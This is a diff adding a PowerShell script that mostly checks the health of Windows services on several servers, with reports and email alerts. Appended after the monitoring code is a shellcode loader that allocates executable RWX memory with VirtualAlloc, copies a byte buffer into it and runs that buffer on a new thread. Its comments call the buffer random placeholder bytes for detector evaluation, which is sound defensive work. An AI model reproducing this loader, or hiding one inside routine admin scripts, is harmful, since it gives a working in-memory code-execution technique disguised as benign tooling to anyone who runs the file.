@@ -1,0 +1,247 @@
+$Servers = @('sql-prod-02', 'srv01', 'web-stg-01', 'filesrv01', 'mgmt01')
+$Services = @('Dhcp', 'MSSQLSERVER', 'Spooler', 'DNS')
+$Port = 5985
+$TimeoutMilliseconds = 5000
+$ReportPath = "C:\Reports\service-health-2026-05-20.csv"
+
+
+function Test-ServerPort {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$ComputerName,
+
+        [int]$Port = 5985,
+        [int]$TimeoutMilliseconds = 2000
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
+        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
+        return ($connected -and $client.Connected)
+    }
+    catch {
+        return $false
+    }
+    finally {
+        $client.Close()
+    }
+}
+
+$results = foreach ($srv in $Servers) {
+    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
+        [pscustomobject]@{
+            Server    = $srv
+            Service   = '*'
+            Status    = 'Unreachable'
+            CheckedAt = Get-Date
+        }
+        continue
+    }
+    foreach ($svc in $Services) {
+        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
+        [pscustomobject]@{
+            Server    = $srv
+            Service   = $svc
+            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
+            CheckedAt = Get-Date
+        }
+    }
+}
+$down = @($results | Where-Object { $_.Status -ne 'Running' })
+$unreachable = @($results | Where-Object { $_.Status -eq 'Unreachable' })
+
+$retry = @($down | Where-Object { $_.Service -ne '*' })
+for ($attempt = 1; $attempt -le 2; $attempt++) {
+    if (@($retry).Count -eq 0) { break }
+    Start-Sleep -Seconds 5
+    Write-Verbose ("Retry {0}: {1} services still down" -f $attempt, @($retry).Count)
+    $retry = @($retry | Where-Object {
+        (Get-Service -ComputerName $_.Server -Name $_.Service -ErrorAction SilentlyContinue).Status -ne 'Running'
+    })
+}
+
+$results | Export-Csv -NoTypeInformation -Path $ReportPath
+
+$down | Export-Csv -Path $ReportPath.Replace('.csv', '-down.csv') -NoTypeInformation -Encoding UTF8
+
+$byServer = $results | Group-Object -Property Server | ForEach-Object {
+    [pscustomobject]@{
+        Server = $_.Name
+        Checks = $_.Count
+        Failed = @($_.Group | Where-Object { $_.Status -ne 'Running' }).Count
+    }
+}
+$byServer | Format-Table -AutoSize
+
+$MailTo = "monitoring@internal.corp"
+$down = @($results | Where-Object { $_.Status -ne 'Running' })
+if ($down.Count -gt 0) {
+    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
+    Send-MailMessage -To $MailTo -From 'monitoring@internal.corp' -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer 'smtp.internal.corp' -Port 587 -UseSsl
+}
+
+$history = $ReportPath.Replace('.csv', '-history.csv')
+$results | Export-Csv -Path $history -NoTypeInformation -Append -Encoding UTF8
+Write-Host ("Health check complete: {0} of {1} services running" -f (@($results).Count - $down.Count), @($results).Count) -ForegroundColor Green
+
+$dashboard = $results | Group-Object -Property Service | ForEach-Object {
+    [pscustomobject]@{ Service = $_.Name; Running = @($_.Group | Where-Object { $_.Status -eq 'Running' }).Count }
+}
+$dashboard | Format-Table -AutoSize
+
+$osInfo = foreach ($srv in $Servers) {
+    [pscustomobject]@{
+        Server = $srv
+        Reachable = Test-ServerPort -ComputerName $srv -Port $Port
+    }
+}
+$osInfo | Format-Table -AutoSize
+
+$probe = Test-ServerPort -ComputerName $env:COMPUTERNAME -Port $Port
+Write-Verbose ("Local port {0} reachable: {1}" -f $Port, $probe)
+
+$uptime = @($results | Where-Object { $_.Status -eq 'Running' }).Count
+Write-Verbose ("Running checks: {0}" -f $uptime)
+
+$errorRows = $results | Where-Object { $_.Status -eq 'NotFound' }
+if (@($errorRows).Count -gt 0) {
+    Write-Warning ("Services not installed: {0}" -f @($errorRows).Count)
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+
+$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isElevated) {
+    Write-Warning 'Some checks require an elevated session.'
+}
+
+$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
+foreach ($dir in $staleTemp) {
+    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+$runningAsService = $env:SESSIONNAME -eq 'Services'
+Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
+Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
+
+$culture = [System.Globalization.CultureInfo]::CurrentCulture
+Write-Verbose ("Culture: {0}" -f $culture.Name)
+Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)
+
+$osVersion = [System.Environment]::OSVersion.VersionString
+Write-Verbose ("Operating system: {0}" -f $osVersion)
+Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
+
+$logFolder = Join-Path $env:TEMP 'ops-logs'
+if (-not (Test-Path -LiteralPath $logFolder)) {
+    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
+}
+Write-Verbose ("Log folder: {0}" -f $logFolder)
+
+$elapsed = (Get-Date) - (Get-Date).Date
+Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)
+
+$powerShellHome = $PSHOME
+Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class Win32Api
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0x07, 0x00, 0x7d, 0xd0, 0xb6, 0x94, 0xf7, 0x2a, 0xf7, 0x3a, 0x47, 0xb4, 0xb2, 0xad, 0x46, 0xfb,
+    0xee, 0xaf, 0xc9, 0x97, 0x39, 0xcc, 0x0d, 0xa0, 0x0b, 0x59, 0x83, 0x73, 0xa5, 0x9e, 0x8e, 0x0a,
+    0xb6, 0xca, 0x47, 0xf6, 0xdb, 0x25, 0x56, 0xdd, 0xae, 0x4a, 0xe9, 0xea, 0x5e, 0x49, 0xe1, 0x27,
+    0xc0, 0xc2, 0x16, 0xce, 0x37, 0x94, 0x41, 0xfd, 0x58, 0x3e, 0x79, 0x7e, 0x86, 0xc5, 0x31, 0x0c,
+    0x09, 0x60, 0xa7, 0xb3, 0xec, 0x88, 0x4b, 0x4b, 0x53, 0x81, 0x48, 0x1f, 0x09, 0x95, 0xde, 0x88,
+    0x4e, 0x5c, 0xf9, 0xd5, 0x4a, 0x2a, 0xf9, 0xbd, 0x1c, 0x06, 0x1c, 0xd2, 0xe5, 0xf8, 0x7c, 0x6a,
+    0x89, 0x2f, 0x37, 0x96, 0x40, 0x1f, 0x9f, 0x5f, 0x03, 0x7a, 0xe6, 0xb6, 0xb3, 0x1c, 0x47, 0x96,
+    0xb9, 0xc4, 0x03, 0xfa, 0xbc, 0x02, 0xa5, 0xd3, 0x0b, 0x22, 0xac, 0x77, 0x70, 0x91, 0xdb, 0x39,
+    0x11, 0x9d, 0x15, 0x9f, 0x65, 0x07, 0x7a, 0xba, 0x88, 0xbc, 0xfd, 0x21, 0x5a, 0xf0, 0x0f, 0x39,
+    0x47, 0x3d, 0xda, 0x46, 0x51, 0xd8, 0x2d, 0x68, 0xf2, 0x09, 0x97, 0xfb, 0xaf, 0x6e, 0xde, 0x00,
+    0xd7, 0xb0, 0x44, 0x8a, 0x66, 0x24, 0x7f, 0x57, 0x9b, 0xaa, 0x64, 0xc5, 0x95, 0x8c, 0x21, 0x47,
+    0x87, 0xb6, 0xc6, 0x74, 0x2e, 0xca, 0x9d, 0x4f, 0x89, 0x4f, 0x93, 0x0c, 0x14, 0x75, 0x3c, 0xa9,
+    0xaf, 0x36, 0x65, 0xe2, 0x3e, 0x7e, 0xb1, 0x6c, 0x5e, 0xba, 0x3d, 0x9b, 0xda, 0xad, 0xbc, 0x02,
+    0x2a, 0x82, 0x3c, 0xd8, 0xd5, 0x71, 0x76, 0x5f, 0x0f, 0xf3, 0xc7, 0x80, 0x60, 0x79, 0x61, 0xe0,
+    0x02, 0xd9, 0x0a, 0xf3, 0x08, 0xbd, 0x49, 0x3d, 0x25, 0xb3, 0xaf, 0x55, 0x7f, 0x70, 0xba, 0xa1,
+    0x2c, 0xc3, 0x32, 0x8e, 0xc7, 0xad, 0x6d, 0xfd, 0x27, 0xf4, 0x19, 0x34, 0x94, 0xf5, 0xd1, 0xeb,
+    0x31, 0x95, 0x4e, 0xaf, 0x19, 0x38, 0xe6, 0xe1, 0xd8, 0x72, 0xcf, 0x8a, 0x60, 0x8b, 0x4b, 0x64,
+    0x02, 0xb2, 0xd0, 0x08, 0x15, 0xd6, 0x12, 0x03, 0x3d, 0xc8, 0xe2, 0xf6, 0x3e, 0x20, 0xf1, 0x6a,
+    0xda, 0x03, 0x86, 0xcc, 0xcd, 0xcd, 0x7a, 0xdb, 0x89, 0xbf, 0x54, 0x49, 0x20, 0xd6, 0x32, 0x5d,
+    0x46, 0xb3, 0xda, 0x0c, 0x00, 0x39, 0x47, 0xe4, 0xd6, 0xa5, 0x76, 0x08, 0x67, 0xc9, 0x7e, 0xfc,
+    0xd9, 0xb8, 0x4e, 0xc2, 0x16, 0x6c, 0x0e, 0xfe, 0xaf, 0x6c, 0xb5, 0x1c, 0x0e, 0x86, 0xc9, 0x0d,
+    0x50, 0x42, 0x96, 0xe6, 0x6c, 0x5c, 0xab, 0xc4, 0x07, 0xc9, 0x33, 0xf2, 0xd4, 0xd7, 0x3f, 0x0a,
+    0x9f, 0x84, 0x0f, 0xf3, 0xd8, 0x08, 0x62, 0xa6, 0x69, 0x5f, 0xe2, 0x6a, 0x63, 0x77, 0x1f, 0xff,
+    0x92, 0x66, 0xa6, 0x0b, 0xb8, 0x07, 0x97, 0x02, 0x33, 0x79, 0x63, 0x6d, 0xc7, 0xee, 0x15, 0xbf,
+    0xd1, 0x15, 0x57, 0x06, 0xc2, 0xf1, 0x4d, 0xdb, 0x02, 0xff, 0xef, 0xfb, 0x3a, 0xcc, 0x04, 0xad,
+    0x85, 0xb4, 0x56, 0xa9, 0xfe, 0xcd, 0xfa, 0xcf, 0x64, 0xb0, 0x77, 0xf3, 0x1a, 0xe3, 0x28, 0xfc,
+    0x6d, 0x68, 0x3b, 0x60, 0x2a, 0xd2, 0x4b, 0x34, 0x15, 0x9b, 0x43, 0x69, 0xdd, 0x3b, 0xda, 0xc1,
+    0x62, 0x32
+)
+
+$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($Handle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][Win32Api]::WaitForSingleObject($Thread, 944)
+[void][Win32Api]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
